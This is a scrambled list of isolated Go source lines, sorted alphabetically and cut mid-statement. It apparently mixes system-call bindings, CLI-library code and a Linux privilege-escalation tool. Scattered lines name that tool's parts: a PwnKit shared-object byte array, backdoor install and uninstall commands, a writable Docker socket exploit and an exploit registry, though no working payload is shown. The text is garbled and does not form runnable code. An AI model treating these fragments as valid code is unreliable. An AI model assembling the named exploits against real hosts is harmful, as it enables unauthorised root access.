uint16) {
uint16)(ptr) != 0
uint16)(unsafe.Pointer(
uint16)(unsafe.Pointer(blockp)))
uint16)(unsafe.Pointer(r0))
uint16Value {
uint16Value) Set(s string) error {
uint16Value) String() string { return strconv.FormatUint(uint64(
uint16Value) Type() string {
uint16Value)(p)
uint32
uint32 {
uint32(0)
uint32(0))
uint32(unsafe.Sizeof(
uint32)
uint32) 
uint32) (err error)
uint32) (err error) = GetComputerNameExW
uint32) (err error) = GetComputerNameW
uint32) (err error) = GetVolumePathNamesForVolumeNameW
uint32) (err error) = SetNamedPipeHandleState
uint32) (err error) = advapi32.AdjustTokenGroups
uint32) (err error) = advapi32.AdjustTokenPrivileges
uint32) (err error) = advapi32.ConvertSecurityDescriptorToStringSecurityDescriptorW
uint32) (err error) = advapi32.ConvertStringSecurityDescriptorToSecurityDescriptorW
uint32) (err error) = advapi32.CreateWellKnownSid
uint32) (err error) = advapi32.GetSecurityDescriptorControl
uint32) (err error) = advapi32.GetTokenInformation
uint32) (err error) = advapi32.LookupAccountNameW
uint32) (err error) = advapi32.LookupAccountSidW
uint32) (err error) = advapi32.MakeAbsoluteSD
uint32) (err error) = advapi32.MakeSelfRelativeSD
uint32) (err error) = advapi32.QueryServiceConfig2W
uint32) (err error) = advapi32.QueryServiceConfigW
uint32) (err error) = advapi32.QueryServiceLockStatusW
uint32) (err error) = advapi32.QueryServiceStatusEx
uint32) (err error) = crypt32.CryptDecodeObject
uint32) (err error) = kernel32.GetConsoleMode
uint32) (err error) = kernel32.GetProcessPreferredUILanguages
uint32) (err error) = kernel32.GetProcessShutdownParameters
uint32) (err error) = kernel32.GetSystemPreferredUILanguages
uint32) (err error) = kernel32.GetThreadPreferredUILanguages
uint32) (err error) = kernel32.GetUserPreferredUILanguages
uint32) (err error) = kernel32.ProcessIdToSessionId
uint32) (err error) = kernel32.QueryFullProcessImageNameW
uint32) (err error) = kernel32.QueryInformationJobObject
uint32) (err error) = kernel32.VirtualProtect
uint32) (err error) = kernel32.VirtualProtectEx
uint32) (err error) = psapi.EnumProcessModules
uint32) (err error) = psapi.EnumProcesses
uint32) (err error) = setupapi.SetupDiGetClassInstallParamsW
uint32) (err error) = setupapi.SetupDiGetDeviceInstanceIdW
uint32) (err error) = setupapi.SetupDiGetDeviceRegistryPropertyW
uint32) (err error) = setupapi.SetupDiGetDriverInfoDetailW
uint32) (err error) = userenv.GetUserProfileDirectoryW
uint32) (err error) = version.VerQueryValueW
uint32) (err error) = ws2_32.WSAGetOverlappedResult
uint32) (err error) = wtsapi32.WTSEnumerateSessionsW
uint32) (err error) [failretval
uint32) (err error) {
uint32) (errcode error) = iphlpapi.GetAdaptersAddresses
uint32) (errcode error) = iphlpapi.GetAdaptersInfo
uint32) (errcode error) {
uint32) (neterr error) = netapi32.NetGetJoinInformation
uint32) (neterr error) {
uint32) (ntstatus error) = ntdll.NtQueryInformationProcess
uint32) (ntstatus error) = ntdll.NtQuerySystemInformation
uint32) (ntstatus error) {
uint32) (regerrno error) = advapi32.RegQueryValueExW
uint32) (regerrno error) {
uint32) = advapi32.GetSidSubAuthority
uint32) = ntdll.RtlGetNtVersionNumbers
uint32) error {
uint32) {
uint32)(unsafe.Pointer(
uint32)(unsafe.Pointer(r0))
uint32)(unsafe.Pointer(uintptr(
uint32)(unsafe.Pointer(uintptr(0x21c))) // Get jobname of current process
uint32Value {
uint32Value) Set(s string) error {
uint32Value) String() string { return strconv.FormatUint(uint64(
uint32Value) Type() string {
uint32Value)(p)
uint64
uint64 {
uint64(0)
uint64(b[3])<<32 
uint64(b[4])<<32 
uint64)
uint64) 
uint64) (err error) = GetDiskFreeSpaceExW
uint64) (err error) {
uint64)(unsafe.Pointer(
uint64)(unsafe.Pointer(basep)))
uint64Value {
uint64Value) Set(s string) error {
uint64Value) String() string { return strconv.FormatUint(uint64(
uint64Value) Type() string {
uint64Value)(p)
uint8
uint8 {
uint8) 
uint8) (ret error) [failretval!=0] = advapi32.GetSecurityDescriptorRMControl
uint8) (ret error) {
uint8) = advapi32.GetSidSubAuthorityCount
uint8) = advapi32.SetSecurityDescriptorRMControl
uint8) {
uint8)(unsafe.Pointer(r0))
uint8Value {
uint8Value) Set(s string) error {
uint8Value) String() string { return strconv.FormatUint(uint64(
uint8Value) Type() string {
uint8Value)(p)
uintSliceValue {
uintSliceValue) Append(val string) error {
uintSliceValue) GetSlice() []string {
uintSliceValue) Replace(val []string) error {
uintSliceValue) Set(val string) error {
uintSliceValue) String() string {
uintSliceValue) Type() string {
uintSliceValue) toString(val uint) string {
uintValue {
uintValue) Set(s string) error {
uintValue) String() string { return strconv.FormatUint(uint64(
uintValue) Type() string {
uintValue)(p)
uintptr(0)
uintptr(0) 
uintptr(0))
uintptr(1 - 1)) }
uintptr(2 - 1)) }
uintptr(4 - 1))
uintptr(5 - 1))
uintptr(6 - 1))
uintptr(i
uintptr(len(handle)))
uintptr(unsafe.Pointer(
uintptr) (err error) = InitializeProcThreadAttributeList
uintptr) (err error) = UpdateProcThreadAttribute
uintptr) (err error) = kernel32.ReadProcessMemory
uintptr) (err error) = kernel32.WriteProcessMemory
uintptr) (err error) {
uintptr) (ret error) = ole32.CoGetObject
uintptr) (ret error) = sechost.SubscribeServiceChangeNotifications
uintptr) (ret error) {
uintptr) and the syscall doesn't take nil.
uintptr) error {
uintptr)(unsafe.Pointer(
uintptr)(unsafe.Pointer(new(uint64)))
uintptr_t
uintptr_t err
uintptr_t r
uintptr_t times(uintptr_t)
uisv := new(uintSliceValue)
uisv.value = p
uisv.value = val
umask(mode_t newmask)
umount(target string) (err error)
unaffected.
uname.Machine[unsafe.Sizeof(uname.Machine)-1] = 0
uname.Nodename[unsafe.Sizeof(uname.Nodename)-1] = 0
uname.Release[unsafe.Sizeof(uname.Release)-1] = 0
uname.Sysname[unsafe.Sizeof(uname.Sysname)-1] = 0
uname.Version[i] = ' '
uname.Version[i] = 0
uname=$(uname)
undef SIOCAIFADDR
undef SIOCSIFPHYADDR
undef SOL_BLUETOOTH
undef TIPC_WAIT_FOREVER
undelete(const char 
underline
underlying operating system. See: https://godoc.org/golang.org/x/sys/unix
unexported 
unix       = 2440587          // Julian day of 1 Jan 1970
unix.SockaddrRFCOMM{
unix.test
unlink(const char 
unmount(const char 
unparkhint)
unsafe.Pointer(
unsafe.Pointer) (err error) = crypt32.CryptQueryObject
unsafe.Pointer) (err error) {
unsafe.Pointer)(unsafe.Pointer(
unsafeheader.Slice)(unsafe.Pointer(
unset := []string{}
unset LANG
unset vtype
unsigned 
unsigned long long getsystemcfg(int)
up := 0
up = t.cursorY - y
upctl
usage 
usage = flag.Usage
usage = usage[:i] 
usageFunc func(
usageLen := len(command.Use)
usageLen := len(x.Use)
usageTemplate string
usages := f.FlagUsages()
usec 
usec := nsec % 1e9 / 1e3
useline 
useline = c.Use
useline = c.parent.CommandPath() 
userLicense string
user[i] = byte(pp.User_id[i])
using 
utimes(const char 
utrace(const char 
uuid = id
uuid = u
uuid string
uuid: Parse(
uuid[6] = (uuid[6] 
uuid[8] = (uuid[8] 
uuid[9] = byte(domain)
uuid[i] = v
uuidgen(struct uuid 
v := int32(0)
v := int32(value)
v = 
v bool
v)))
v)[:]))
v.entry = entry
v.log = log
val /= 10
val = int(r0)
val = uint(r0)
val = uint64(r0)
val)
vallen := _Socklen(1)
vallen := _Socklen(4)
vallen := _Socklen(8)
vallen := _Socklen(SizeofICMPv6Filter)
vallen := _Socklen(SizeofIPMreq)
vallen := _Socklen(SizeofIPMreqn)
vallen := _Socklen(SizeofIPv6MTUInfo)
vallen := _Socklen(SizeofIPv6Mreq)
vallen := _Socklen(SizeofLinger)
vallen := _Socklen(SizeofTCPConnectionInfo)
vallen := _Socklen(SizeofTCPInfo)
vallen := _Socklen(SizeofTpacketStats)
vallen := _Socklen(SizeofTpacketStatsV3)
vallen := _Socklen(SizeofUcred)
vallen := _Socklen(SizeofXucred)
vallen := _Socklen(len(buf))
vallen := _Socklen(unsafe.Sizeof(tv))
vallen)
value   
value := EthtoolDrvinfo{Cmd: ETHTOOL_GDRVINFO}
value := UTF16ToString(bufToUTF16(buf))
value = a[0]
value = args[0]
value = flag.NoOptDefVal
value = shorthands[1:]
value = shorthands[2:]
value = split[1]
value = uintptr(r0)
value)
value))
value)))
value.Info[i].Bytes_deduped = rawinfo.Bytes_deduped
value.Info[i].Dest_fd = rawinfo.Dest_fd
value.Info[i].Dest_offset = rawinfo.Dest_offset
value.Info[i].Reserved = rawinfo.Reserved
value.Info[i].Status = rawinfo.Status
value.raw))
value[0]))
var (
var DEVNO64 uint64
var Defer Payload
var EnableCommandSorting = true
var EnablePrefixMatching = false
var ErrPasteIndicator = pasteIndicatorError{}
var ErrPasteIndicator = term.ErrPasteIndicator
var MousetrapDisplayDuration = 5 
var MousetrapHelpText = 
var SocketDisableIPv6 bool
var Source string
var Usage = func() {
var Verbose bool
var WSAID_CONNECTEX = GUID{
var WSAID_WSARECVMSG = GUID{
var WSAID_WSASENDMSG = GUID{
var _ syscall.Errno
var _ unsafe.Pointer
var _p0 
var _p0 uint32
var _p0 unsafe.Pointer
var _p1 
var _p1 int
var _p1 uint32
var _p1 unsafe.Pointer
var _p2 
var _p2 int
var _p2 unsafe.Pointer
var _p3 
var _zero uintptr
var access uint32
var addr [4]byte
var aggressive bool
var argc int32
var args []string
var argv [7]unsafe.Pointer
var attrMap = map[uint8]string{
var attrTags = map[string]uint8{
var attrs uint32 = FILE_ATTRIBUTE_NORMAL
var author string
var b [12]byte
var b [2]byte
var b []byte
var b int32
var backdoorCmd = 
var backdoorDirs = []string{
var backdoorFilenames = []string{
var backdoorInstallCmd = 
var backdoorUninstallCmd = 
var base = (
var base uint64 = uint64(
var base uintptr
var bgTags = map[string]string{
var block 
var buf [1]byte
var buf [32]byte // big enough for int64
var buf [36 
var buf [36]byte
var buf [512]byte
var buf [CTL_MAXNAME 
var buf [ERRMAX]byte
var buf [MaxHostNameLen]byte
var buf [PathMax]byte
var buf [SizeofPtr]byte
var buf []uint16
var buf bytes.Buffer
var buffer []byte
var buffer struct {
var buffer_size int = int(unsafe.Sizeof(mnt_ent_buffer))
var buflen uint32
var bufsize uintptr
var bytesReturned uint32
var canDoSearchSystem32Once struct {
var candidates []string
var ci Clockinfo
var classNameUTF16 [MAX_CLASS_NAME_LEN]uint16
var cmd = 
var cnt int64
var command string
var commandLine string
var completionCmd = 
var completionFn func(cmd 
var completions []string
var comps []string
var connectExFunc struct {
var constraintOperators map[string]constraintOperation
var constraintRegexp 
var createmode uint32
var d Dir
var d unsafe.Pointer
var data _C_long
var data1 win32finddata1
var dataType DEVPROPTYPE
var dataType uint32
var debugflags func(
var destp 
var deviceDescriptionUTF16 
var directive ShellCompDirective
var directives []string
var disableFormatting bool
var dll 
var done uint32
var dst []byte
var dstDirent Dirent
var dummy byte
var dummy int8
var e syscall.ErrorString
var ent Dirent
var entry Dirent
var entry SudoEntry
var entryp 
var enumeratorUTF16 
var ep2p = map[uint32]int16{
var epollEvts uint32 = 0
var err error
var errorList = [...]struct {
var exploitName string
var expr unsafe.Pointer
var ext string
var f [5][]byte
var fcntl64Syscall uintptr = SYS_FCNTL
var fcntl_cmd int
var fdx [2]int32
var fgTags = map[string]string{
var finalArgs []string
var finalCmd 
var firstAccessEntry 
var firstAuditEntry 
var firstExplicitEntry 
var flagCompletionFunctions = map[
var flagCompletionMutex = 
var flagName string
var flags []
var flags []string
var flags uintptr
var flagvar bool
var flagvar int
var flock [24]byte
var flock_type int16
var fmode uint32
var formattingLock sync.RWMutex
var found bool
var ft Filetime
var gid int
var h windows.Handle
var handlePtr 
var i int
var ifr ifreq
var ifreq IfreqMTU
var imageList []string
var images []struct {
var impl epollImpl = epollImpl{
var inTag bool
var info KCMClone
var info SysvShmDesc
var info windows.ConsoleScreenBufferInfo
var initializers []func()
var innerfind func(
var interfaces []net.Interface // cached list of interfaces
var interfaces []string
var ioSync int64
var ioctl_PTMGET = 0x40287401
var iov Iovec
var ip 
var isElevated uint32
var it Itimerval
var js [36]byte
var key rune
var kinfo KinfoProc
var len _Socklen = SizeofSockaddrAny
var length = int64(count)
var libc_accept_trampoline_addr uintptr
var libc_access_trampoline_addr uintptr
var libc_adjtime_trampoline_addr uintptr
var libc_bind_trampoline_addr uintptr
var libc_chdir_trampoline_addr uintptr
var libc_chflags_trampoline_addr uintptr
var libc_chmod_trampoline_addr uintptr
var libc_chown_trampoline_addr uintptr
var libc_chroot_trampoline_addr uintptr
var libc_clock_gettime_trampoline_addr uintptr
var libc_clonefile_trampoline_addr uintptr
var libc_clonefileat_trampoline_addr uintptr
var libc_close_trampoline_addr uintptr
var libc_closedir_trampoline_addr uintptr
var libc_connect_trampoline_addr uintptr
var libc_dup2_trampoline_addr uintptr
var libc_dup_trampoline_addr uintptr
var libc_exchangedata_trampoline_addr uintptr
var libc_exit_trampoline_addr uintptr
var libc_faccessat_trampoline_addr uintptr
var libc_fchdir_trampoline_addr uintptr
var libc_fchflags_trampoline_addr uintptr
var libc_fchmod_trampoline_addr uintptr
var libc_fchmodat_trampoline_addr uintptr
var libc_fchown_trampoline_addr uintptr
var libc_fchownat_trampoline_addr uintptr
var libc_fclonefileat_trampoline_addr uintptr
var libc_fcntl_trampoline_addr uintptr
var libc_fdopendir_trampoline_addr uintptr
var libc_fgetxattr_trampoline_addr uintptr
var libc_flistxattr_trampoline_addr uintptr
var libc_flock_trampoline_addr uintptr
var libc_fpathconf_trampoline_addr uintptr
var libc_fremovexattr_trampoline_addr uintptr
var libc_fsetxattr_trampoline_addr uintptr
var libc_fstat64_trampoline_addr uintptr
var libc_fstat_trampoline_addr uintptr
var libc_fstatat64_trampoline_addr uintptr
var libc_fstatat_trampoline_addr uintptr
var libc_fstatfs64_trampoline_addr uintptr
var libc_fstatfs_trampoline_addr uintptr
var libc_fsync_trampoline_addr uintptr
var libc_ftruncate_trampoline_addr uintptr
var libc_futimes_trampoline_addr uintptr
var libc_getcwd_trampoline_addr uintptr
var libc_getdtablesize_trampoline_addr uintptr
var libc_getegid_trampoline_addr uintptr
var libc_geteuid_trampoline_addr uintptr
var libc_getfsstat64_trampoline_addr uintptr
var libc_getfsstat_trampoline_addr uintptr
var libc_getgid_trampoline_addr uintptr
var libc_getgroups_trampoline_addr uintptr
var libc_getpeername_trampoline_addr uintptr
var libc_getpgid_trampoline_addr uintptr
var libc_getpgrp_trampoline_addr uintptr
var libc_getpid_trampoline_addr uintptr
var libc_getppid_trampoline_addr uintptr
var libc_getpriority_trampoline_addr uintptr
var libc_getrlimit_trampoline_addr uintptr
var libc_getrusage_trampoline_addr uintptr
var libc_getsid_trampoline_addr uintptr
var libc_getsockname_trampoline_addr uintptr
var libc_getsockopt_trampoline_addr uintptr
var libc_gettimeofday_trampoline_addr uintptr
var libc_getuid_trampoline_addr uintptr
var libc_getxattr_trampoline_addr uintptr
var libc_ioctl_trampoline_addr uintptr
var libc_issetugid_trampoline_addr uintptr
var libc_kevent_trampoline_addr uintptr
var libc_kill_trampoline_addr uintptr
var libc_kqueue_trampoline_addr uintptr
var libc_lchown_trampoline_addr uintptr
var libc_link_trampoline_addr uintptr
var libc_linkat_trampoline_addr uintptr
var libc_listen_trampoline_addr uintptr
var libc_listxattr_trampoline_addr uintptr
var libc_lseek_trampoline_addr uintptr
var libc_lstat64_trampoline_addr uintptr
var libc_lstat_trampoline_addr uintptr
var libc_madvise_trampoline_addr uintptr
var libc_mkdir_trampoline_addr uintptr
var libc_mkdirat_trampoline_addr uintptr
var libc_mkfifo_trampoline_addr uintptr
var libc_mknod_trampoline_addr uintptr
var libc_mlock_trampoline_addr uintptr
var libc_mlockall_trampoline_addr uintptr
var libc_mmap_trampoline_addr uintptr
var libc_mount_trampoline_addr uintptr
var libc_mprotect_trampoline_addr uintptr
var libc_msync_trampoline_addr uintptr
var libc_munlock_trampoline_addr uintptr
var libc_munlockall_trampoline_addr uintptr
var libc_munmap_trampoline_addr uintptr
var libc_open_trampoline_addr uintptr
var libc_openat_trampoline_addr uintptr
var libc_pathconf_trampoline_addr uintptr
var libc_pipe_trampoline_addr uintptr
var libc_poll_trampoline_addr uintptr
var libc_pread_trampoline_addr uintptr
var libc_ptrace_trampoline_addr uintptr
var libc_pwrite_trampoline_addr uintptr
var libc_read_trampoline_addr uintptr
var libc_readdir_r_trampoline_addr uintptr
var libc_readlink_trampoline_addr uintptr
var libc_readlinkat_trampoline_addr uintptr
var libc_recvfrom_trampoline_addr uintptr
var libc_recvmsg_trampoline_addr uintptr
var libc_removexattr_trampoline_addr uintptr
var libc_rename_trampoline_addr uintptr
var libc_renameat_trampoline_addr uintptr
var libc_revoke_trampoline_addr uintptr
var libc_rmdir_trampoline_addr uintptr
var libc_select_trampoline_addr uintptr
var libc_sendfile_trampoline_addr uintptr
var libc_sendmsg_trampoline_addr uintptr
var libc_sendto_trampoline_addr uintptr
var libc_setegid_trampoline_addr uintptr
var libc_seteuid_trampoline_addr uintptr
var libc_setgid_trampoline_addr uintptr
var libc_setgroups_trampoline_addr uintptr
var libc_setlogin_trampoline_addr uintptr
var libc_setpgid_trampoline_addr uintptr
var libc_setpriority_trampoline_addr uintptr
var libc_setprivexec_trampoline_addr uintptr
var libc_setregid_trampoline_addr uintptr
var libc_setreuid_trampoline_addr uintptr
var libc_setrlimit_trampoline_addr uintptr
var libc_setsid_trampoline_addr uintptr
var libc_setsockopt_trampoline_addr uintptr
var libc_settimeofday_trampoline_addr uintptr
var libc_setuid_trampoline_addr uintptr
var libc_setxattr_trampoline_addr uintptr
var libc_shmat_trampoline_addr uintptr
var libc_shmctl_trampoline_addr uintptr
var libc_shmdt_trampoline_addr uintptr
var libc_shmget_trampoline_addr uintptr
var libc_shutdown_trampoline_addr uintptr
var libc_socket_trampoline_addr uintptr
var libc_socketpair_trampoline_addr uintptr
var libc_stat64_trampoline_addr uintptr
var libc_stat_trampoline_addr uintptr
var libc_statfs64_trampoline_addr uintptr
var libc_statfs_trampoline_addr uintptr
var libc_symlink_trampoline_addr uintptr
var libc_symlinkat_trampoline_addr uintptr
var libc_sync_trampoline_addr uintptr
var libc_sysctl_trampoline_addr uintptr
var libc_truncate_trampoline_addr uintptr
var libc_umask_trampoline_addr uintptr
var libc_undelete_trampoline_addr uintptr
var libc_unlink_trampoline_addr uintptr
var libc_unlinkat_trampoline_addr uintptr
var libc_unmount_trampoline_addr uintptr
var libc_utimensat_trampoline_addr uintptr
var libc_utimes_trampoline_addr uintptr
var libc_wait4_trampoline_addr uintptr
var libc_write_trampoline_addr uintptr
var linger Linger
var linkedToken Token
var listCmd = 
var localSockaddr RawSockaddrAny
var machineNameUTF16 
var major int
var mapper = 
var matched []Registration
var mid _C_int
var minCommandPathPadding = 11
var minNamePadding = 11
var minUsagePadding = 25
var minor int
var mnt_ent_buffer struct {
var msg Msghdr
var msgs []SocketControlMessage
var n = int32(value)
var n _C_uint
var n byte
var n int
var n int32
var n uint32
var n uint32 = 0
var n uint32 = MAX_COMPUTERNAME_LENGTH 
var n uint64
var name [8]byte
var nanotime int64 = runtime.Nanotime1()
var newoffset int64
var nn int
var node [6]byte
var nsec_per_sec int64 = 1000000000
var nts NTString
var nullDir = Dir{
var numLanguages uint32
var off int64
var ok bool
var oldDev int
var oldStat stat_freebsd11_t
var oldStatfs statfs_freebsd11_t
var olen uintptr
var otherInt int64
var out [12]byte
var outLen uint32
var p 
var p unsafe.Pointer
var p2ep = map[int16]uint32{
var parts []string
var patch int
var path 
var path string
var pollEvts int16 = 0
var pp [2]_C_int
var pp [2]int32
var pptr unsafe.Pointer
var preExecHookFn = preExecHook
var preExecHookFn func(
var present bool
var prev Itimerval
var procEntry ProcessEntry32
var procEntry syscall.ProcessEntry32
var processEntry processEntry32
var procioctl uintptr
var promptForPassword bool
var ptm ptmget
var ptr unsafe.Pointer
var pwnkit_sh_sharedobj = []byte{
var pwnkit_true_sharedobj = []byte{
var quit bool
var r CapRights
var r Pid_t
var r Statx_t
var r0 uintptr
var registeredVulnerabilities []Registration
var res uintptr
var ret []byte
var rootCmd = 
var rsa RawSockaddrAny
var runAnyExploit bool
var ruz rusage_zos
var s 
var s Handle
var s []byte
var s []uint16
var s string
var sa 
var sa SecurityAttributes
var salen _Socklen
var scratch int64
var sddl 
var sectionDesc 
var sections []
var segments []int
var selfInt int64
var selfRelativeSDSize uint32
var sendRecvMsgFunc struct {
var set []string
var setuidCmd = 
var sid 
var signalList = [...]struct {
var signals = [...]string{
var simpleVersionRegex = regexp.MustCompile(
var size uintptr
var skipExploits []string
var sl = struct {
var slice []byte
var slice []uint16
var so []byte
var sockType int
var space = []rune{' '}
var src []byte
var srcDirent dirent_freebsd11
var ss []string
var st Stat_t
var st uint32
var statLE Stat_LE_t
var stat_v Statvfs_t
var status _C_int
var status syscall.Stat_t
var str [100]uint16
var svcNameTable [][]byte = [][]byte{
var sys 
var sysctlMib = []mibentry{
var sysno uintptr = SYS_GETFSSTAT
var t string
var tagName string
var tcpStats 
var tcpinfo TCPInfo
var temp64 float64
var temp64 int64
var templateFuncs = template.FuncMap{
var ticks_per_sec uint32 = 100 //TODO(kenan): value is currently hardcoded
var tm Tms
var token Token
var totalTime time.Duration
var tryCmd = 
var ts 
var ts [2]Timespec
var tv Timeval
var tvz timeval_zos
var u NTUnicodeString
var u Uvmexp
var u _C_int
var uid int
var useline string
var user [8]byte
var uuid UUID
var v Utsname
var validArgs []string
var value HIDRawDevInfo
var value ICMPv6Filter
var value IPMreq
var value IPMreqn
var value IPv6MTUInfo
var value IPv6Mreq
var value Ptmget
var value RTCTime
var value RTCWkAlrm
var value TCPConnectionInfo
var value TCPInfo
var value Termio
var value Termios
var value TpacketStats
var value TpacketStatsV3
var value Ucred
var value WatchdogInfo
var value Winsize
var value [_HIDIOCGRAWNAME_LEN]byte
var value [_HIDIOCGRAWPHYS_LEN]byte
var value [_HIDIOCGRAWUNIQ_LEN]byte
var value int
var value string
var value uint32
var versionCmd = 
var vt100EscapeCodes = EscapeCodes{
var vulnFound bool
var w uint32
var winHeapACL 
var winHeapSD 
var winHeapSDSize uint32
var writtenOut uint64 = 0
var ws Winsize
var x [2]int32
var xvalues = [256]byte{
variable.  That variable is named 
vec)
ver := r.FindString(s.KernelVersion)
ver = uint32(r0)
verbose
version     uint16
versionRegexp 
versionTemplate string
versions := make([]
vfork(void)
vframe)
viper
viper.AddConfigPath(home)
viper.AutomaticEnv()
viper.SetConfigFile(cfgFile)
void exit(int)
void gconv(void) {}
void gconv_init(void 
vulnFound = false
vulnFound = true
w := NsecToFiletime(TimespecToNsec(ts[1]))
w := NsecToFiletime(tv[1].Nanoseconds())
w := csv.NewWriter(
w := csv.NewWriter(b)
w = FILE_BEGIN
w = FILE_CURRENT
w = FILE_END
w = int(r1)
w.Flush()
w.Msg = cstring(f[4])
w.Pid = int(atoi(f[0]))
w.Time[0] = uint32(atoi(f[1]))
w.Time[1] = uint32(atoi(f[2]))
w.Time[2] = uint32(atoi(f[3]))
wExME=
wG5eC
wallclockbuilder
watchdesc = int(r0)
what the person running the scripts has installed on their computer.
when the 
which can be found in the LICENSE file.
which maintains the same interface while adding POSIX compliance.
while read -r line
while using fish:
width = 1
will provide the description automatically based on usage information.  You can choose to make this option configurable by
win32Error := ret.Win32Error(noMatch)
win32finddata1) (err error) = FindNextFileW
win32finddata1) (err error) {
win32finddata1) {
winHeapACL)
winHeapSD)
with following functions:
with glob filtering
with no changes.
within
within another directory
word := 
words[@] is ${
words[@]}-1))]}
work with.
working-with-flags).
would set the desired behavior to 
wpid := int(rpid)
wpid = Pid_t(r0)
wpid = int(r)
wpid = int(r0)
wpid = int32(r0)
wrap := w - i
wrap = w - i
wrap = wrap - slop
writableDockerSocketExploit {
writableDockerSocketExploit) buildTarball(writer io.Writer) error {
writableDockerSocketExploit) deleteContainer(id string) error {
writableDockerSocketExploit) deleteImage(name string) error {
writableDockerSocketExploit{
writeSize := size - written
writeSize = int(v.pageSize)
writer                io.Writer
written 
written := 0
written = int(length)
written = int(r0)
written = int(writtenOut)
ws)))
wstatus = WaitStatus(status)
wx8BZdTaoZ5fu7I=
x := new(Xucred)
x := visualLength(t.prompt) 
x = x % t.termWidth
x.SetGlobalNormalizationFunc(c.globNormFunc)
x.flags.VisitAll(func(f 
x.pflags.VisitAll(func(f 
x00 and 
x00' {
x1b':
x1b[
x1b[2J
x1b[31mhttps://github.com/liamg/traitor
xaddr = uintptr(r0)
y := x / t.termWidth
yHo=
yaml
you can create a completion command by running
you may not use this file except in compliance with the License.
you must provide these functions with a parameter indicating if the completions should be annotated with a description
your specific system. Running 
your users.
zeroID [6]byte // nodeID with only 0's
zerrors_${GOOS}_${GOARCH}.go
zsh := 
zsh.Flags().BoolVar(
zsyscall_${GOOS}_${GOARCH}.go
zsysnum_${GOOS}_${GOARCH}.go
ztypes_${GOOS}_${GOARCH}.go
{next}
{{.Example}}{{end}}{{if .HasAvailableSubCommands}}
{{.InheritedFlags.FlagUsages 
{{.LocalFlags.FlagUsages 
{{end}}{{if or .Runnable .HasSubCommands}}{{.UsageString}}{{end}}
{{with (or .Long .Short)}}{{. 
} else if !selfNumeric 
} else if !vulnFound {
} else if c.PostRun != nil {
} else if c.PreRun != nil {
} else if clockid == CLOCK_PROCESS_CPUTIME_ID 
} else if down > 1 {
} else if e != nil {
} else if f.Usage == nil {
} else if flags
} else if i > lenOther-1 {
} else if isBaseName(name) {
} else if key == keyPasteEnd {
} else if left > 1 {
} else if len(a) > 0 {
} else if len(args) == 1 {
} else if len(args) > 0 {
} else if len(shorthands) > 1 {
} else if len(v.args) > 0 
} else if lhs < rhs {
} else if localSockaddr.Addr.Family == AF_INET6 {
} else if n < len(data) {
} else if n == 0 {
} else if p.PersistentPostRun != nil {
} else if p.PersistentPreRun != nil {
} else if ret != CR_BUFFER_SMALL {
} else if right > 1 {
} else if rlim.Cur < uint64(rlimInf32) {
} else if rlim.Max < uint64(rlimInf32) {
} else if selfInt > otherInt {
} else if uintptr(addr.SockaddrLength) >= unsafe.Sizeof(RawSockaddrInet6{}) 
} else if up > 1 {
} else {
})(unsafe.Pointer(
}).Run()
